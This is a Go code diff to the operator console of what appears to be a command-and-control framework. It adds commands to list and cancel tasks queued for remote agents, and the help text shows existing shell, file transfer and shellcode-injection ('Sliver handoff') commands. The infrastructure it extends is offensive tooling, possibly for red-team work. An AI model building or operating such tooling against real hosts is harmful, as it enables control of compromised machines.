@@ -19,7 +19,7 @@ var globalCmds = []string{
 
 var sessionCmds = []string{
 	"info", "shell", "sleep", "download", "upload", "stage2",
-	"results", "kill", "back",
+	"results", "tasks", "tasks-kill", "kill", "back",
 }
 
 var buildTransports = []string{"http", "mtls"}
@@ -266,6 +266,42 @@ func (op *Operator) Run() {
 			}
 			op.cmdResults(target, limit)
 
+		case "tasks":
+			if op.current == "" {
+				fmt.Println("no agent selected")
+				continue
+			}
+			limit := 20
+			if len(parts) >= 2 {
+				parsed, err := strconv.Atoi(parts[1])
+				if err != nil || parsed <= 0 {
+					fmt.Println("usage: tasks [limit]")
+					continue
+				}
+				limit = parsed
+			}
+			op.cmdTasks(op.current, limit)
+
+		case "tasks-kill":
+			if op.current == "" {
+				fmt.Println("no agent selected")
+				continue
+			}
+			if len(parts) < 2 {
+				fmt.Println("usage: tasks-kill <task_id>")
+				continue
+			}
+			taskID, err := strconv.ParseInt(parts[1], 10, 64)
+			if err != nil || taskID <= 0 {
+				fmt.Println("invalid task id:", parts[1])
+				continue
+			}
+			if err := op.db.CancelTask(taskID, op.current); err != nil {
+				fmt.Println("error:", err)
+				continue
+			}
+			fmt.Printf("[+] task #%d cancelled\n", taskID)
+
 		case "gencert":
 			if len(parts) < 2 {
 				fmt.Println("usage: gencert <label>")
@@ -431,6 +467,26 @@ func (op *Operator) cmdResults(id string, limit int) {
 		if r.Error != "" {
 			fmt.Printf("[err] %s\n", r.Error)
 		}
+	}
+}
+
+func (op *Operator) cmdTasks(id string, limit int) {
+	tasks, err := op.db.RecentTasks(id, limit)
+	if err != nil {
+		fmt.Println("error:", err)
+		return
+	}
+	if len(tasks) == 0 {
+		fmt.Println("no tasks")
+		return
+	}
+	fmt.Printf("%-8s  %-10s  %-20s  %s\n", "ID", "STATUS", "TYPE", "ARGS")
+	for _, t := range tasks {
+		args := strings.ReplaceAll(t.Args, "\n", " ")
+		if len(args) > 60 {
+			args = args[:60] + "…"
+		}
+		fmt.Printf("%-8d  %-10s  %-20s  %s\n", t.ID, t.Status, t.Type, args)
 	}
 }
 
@@ -672,6 +728,8 @@ Session commands (require 'use <id>'):
   upload <local> <remote_path>     push file to agent  [TAB completes files]
   stage2 <shellcode.bin>           inject shellcode (Sliver handoff)  [TAB completes files]
   results [limit]                  show last N task results
+  tasks [limit]                    show queued and completed tasks
+  tasks-kill <task_id>             cancel a pending task
   kill                             terminate agent
   back                             deselect agent
 
